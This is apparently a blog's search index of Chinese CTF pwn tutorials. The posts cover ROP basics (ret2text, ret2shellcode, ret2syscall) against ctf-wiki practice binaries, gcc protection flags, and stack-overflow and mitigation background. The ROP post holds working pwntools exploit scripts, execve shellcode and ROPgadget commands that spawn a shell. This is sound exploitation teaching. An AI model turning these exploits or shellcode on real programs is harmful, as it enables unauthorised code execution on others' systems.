<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>基本ROP</title>
    <link href="/posts/496bcb83b3a4/"/>
    <url>/posts/496bcb83b3a4/</url>
    
    <content type="html"><![CDATA[<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</strong>。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ol><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ol><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><strong>查看一下程序的保护机制</strong><br><img src="https://t.gmit.vip/2023/02/14/x3m2b6.png"><br>可以看到这是开启了NX保护的32位程序</p><p><strong>ida查看代码</strong><br><img src="https://t.gmit.vip/2023/02/14/x3mb4j.png"></p><p>主程序中使用了gets函数，存在栈溢出。</p><p>在.text段发现<br><img src="https://t.gmit.vip/2023/02/14/uhf81e.png"></p><p>得到地址0X0804863A，我们只需要把这个地址覆盖到会返回地址即可。</p><p><strong>求偏移</strong></p><p>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png"></p><p>运行输入后</p><p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png"><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png"></p><p>偏移量为112</p><p><strong>exp</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br><br>address = p32(<span class="hljs-number">0x804863a</span>)<br>offset = <span class="hljs-number">112</span><br><br>payload = offset*b<span class="hljs-string">&#x27;a&#x27;</span> + address<br><br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p>运行<br><img src="https://t.gmit.vip/2023/02/14/w69ij0.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>文件:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p><strong>查看一下程序的保护机制</strong></p><p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png"><br>没有任何保护</p><p>ida查看代码</p><p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png"></p><p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png"><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png"><br>具有可执行权限</p><p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png"></p><p>运行输入后</p><p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png"><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png"></p><p>偏移量为112</p><p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p><p><strong>exp</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，可直接突破NX保护，获取 shell。</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p><strong>检测保护</strong><br><img src="https://pic.imgdb.cn/item/63ede4faf144a0100701c905.png"></p><p><strong>ida查看源码</strong><br><img src="https://pic.imgdb.cn/item/63ede589f144a01007028cbb.png"><br>依然是gets函数溢出</p><p>利用cyclic方法查到偏移量还是112</p><p><strong>接着利用系统调用来获取shell</strong><br><img src="https://pic.imgdb.cn/item/63ede698f144a01007043373.png"></p><p><strong>查找”pop eax; ret”</strong><br>命令：ROPgadget –binary ret2syscall –only “pop|ret” | grep “eax”<br><img src="https://pic.imgdb.cn/item/63ede7bdf144a0100706266d.png"></p><p><strong>查找”pop ebx, pop ecx, pop edx; ret”</strong><br>命令：ROPgadget –binary ret2syscall –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”<br><img src="https://pic.imgdb.cn/item/63ede8bbf144a010070779dc.png"></p><p><strong>查找”/bin/sh”</strong><br>命令：ROPgadget –binary ret2syscall –string “/bin/sh”<br><img src="https://pic.imgdb.cn/item/63ede95cf144a0100708449b.png"></p><p><strong>查找”int 0x80”</strong><br>命令：ROPgadget –binary ret2syscall –only “int” | grep “0x80”<br><img src="https://pic.imgdb.cn/item/63edea55f144a010070a35cc.png"></p><p><strong>找到所有条件之后，构造exp</strong></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&quot;linux&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span> = <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">offset</span> = 112</span><br><span class="hljs-function"><span class="hljs-title">pop_eax</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080bb196)</span></span><br><span class="hljs-function"><span class="hljs-title">pop_edx_ecx_ebx</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0806eb90)</span></span><br><span class="hljs-function"><span class="hljs-title">bin_sh</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080be408)</span></span><br><span class="hljs-function"><span class="hljs-title">int_0x80</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x08049421)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">flat</span><span class="hljs-params">([b<span class="hljs-string">&quot;a&quot;</span> * offset, pop_eax, <span class="hljs-number">0</span>xb, pop_edx_ecx_ebx, p32(<span class="hljs-number">0</span>), p32(<span class="hljs-number">0</span>), bin_sh, int_0x80])</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p><p><a href="https://blog.csdn.net/qq_38025365/article/details/87968945">https://blog.csdn.net/qq_38025365/article/details/87968945</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn的一些常用命令</title>
    <link href="/posts/09672755a094/"/>
    <url>/posts/09672755a094/</url>
    
    <content type="html"><![CDATA[<h1 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h1><p><strong>GCC编译参数：</strong><br><font color = "red">-m32</font>：编译为32位程序。</p><p><font color = "red">-m64</font>：编译为64位程序。</p><p><font color = "red">-fstack-protector</font>：启用栈溢出保护，但只为局部变量中含有数组的函数插入保护。</p><p><font color = "red">-fstack-protector-all</font>：启用栈溢出保护，为所有函数插入保护。</p><p><font color = "red">-fno-stack-protector</font>：禁用栈溢出保护。</p><p><font color = "red">-z noexecstack</font>：开启NX保护。</p><p><font color = "red">-z execstack</font>：关闭NX保护。</p><p><font color = "red">-z norelro </font>：关闭relro。</p><p><font color = "red">-z lazy</font>：开启relro，等级为1。</p><p><font color = "red">-z now</font>：开启relro，等级为2。</p><p><font color = "red">-fpie -pie</font>：开启pie，此时强度为1。</p><p><font color = "red">-fPIE -pie</font>：开启pie，此时最高强度为2。</p><p><font color = "red">-no-pie</font>：关闭pie。</p><p><font color = "red">-o</font>：制定目标名称, 默认的时候, gcc 编译出来的文件是 a.out。<br>用法：gcc -o hello.exe hello.c</p><h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p><strong>查看文件属性：</strong> <font color = "red">file 文件名</font><br><img src="https://pic.imgdb.cn/item/63ee2c58f144a01007aaa96a.png"></p><p><strong>查看文件防护：</strong><font color = "red">checksec 文件名</font><br><img src="https://pic.imgdb.cn/item/63ee2db8f144a01007afb099.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn基础知识</title>
    <link href="/posts/89381d94430e/"/>
    <url>/posts/89381d94430e/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是pwn？"><a href="#什么是pwn？" class="headerlink" title="什么是pwn？"></a>什么是pwn？</h2><p>“pwn”是一个黑客语法的俚语，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。感觉就是向目标发送特定的数据，使其执行我们发送的恶意代码，以获取目标机器的最高使用权限。 </p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>概念：在计算机中，当要表示的数据超出计算机所使用的数据的表示范围时，则产生数据的溢出。</p><p>产生的原因：</p><ol><li>使用非类型安全(non-type-safe)的语言，如：C/C++等。</li><li>以不可靠的方式存取或者复制内存缓冲区。</li><li>编译器设置的内存缓冲区太靠近关键数据结构。</li></ol><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>ESP(X86)/RSP(X64)：用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p><p>EBP(X86)/RBP(X64)：用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p><p>EIP(X86)/RIP(X64)：用来存储即将要执行的程序指令的地址。</p><p>其他更多寄存器可参考：<a href="https://blog.csdn.net/ComputerInBook/article/details/122955217">https://blog.csdn.net/ComputerInBook/article/details/122955217</a></p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p>32位X86架构下汇编指令有两种格式intel与AT&amp;T</p><p>intel：寄存器名称和数值前无符号。</p><p>AT&amp;T：寄存器名字前加“%”，数值前加“$”。</p><p>链接1：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x86-instructions">X86汇编指令</a></p><p>链接2：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x64-instructions">x64汇编指令</a></p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作。</p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p><p>函数调用栈的工作过程：<a href="https://www.bilibili.com/video/BV1Xt411x7Dr/?spm_id_from=trigger_reload&vd_source=75b0e2176ed6115febad096a2562ae52">32位程序动画演示</a></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别：</p><p>x86：函数参数在函数返回地址的上方</p><p>x64：</p><ol><li>System Ⅴ AMD64 ABI(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在RDI，RSI，RDX，RCX，R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</li></ol><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧就是一个函数执行的环境：函数参数、函数的局部变量、函数执行完后返回到哪里等等。</p><p>每一个栈帧代表的就是一个未运行完的函数  。</p><p><img src="https://t.gmit.vip/2023/02/07/w92msl.png"></p><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ol><li><p>程序必须向栈上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li><li></li></ol><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR（PIE）的话各个系统调用的地址就是随机化的。</p><ol><li><p>canary(栈保护)</p><p> 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p></li><li><p>NX（DEP）</p><p> NX即No-execute(不可执行)的意思，NX(DEP)的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行指令。</p></li><li><p>PIE（ASLR）<br> 一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br> 内存地址随机化机制(address space layout randomization)，有以下三种情况<br> <strong>0-表示关闭进程地址空间随机化。<br> 1-表示将mmp的基址，satck和vdso页面随机化。<br> 2-表示在1的基础上增加栈的随机化。</strong><br> 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止进攻者在堆栈上运行恶意代码。</p></li><li><p>FORTIFY<br> 这个保护机制防止缓冲区溢出攻击。gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p></li><li><p>RELRO<br> 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a></p><p><a href="https://blog.csdn.net/ComputerInBook/article/details/122955217">https://blog.csdn.net/ComputerInBook/article/details/122955217</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
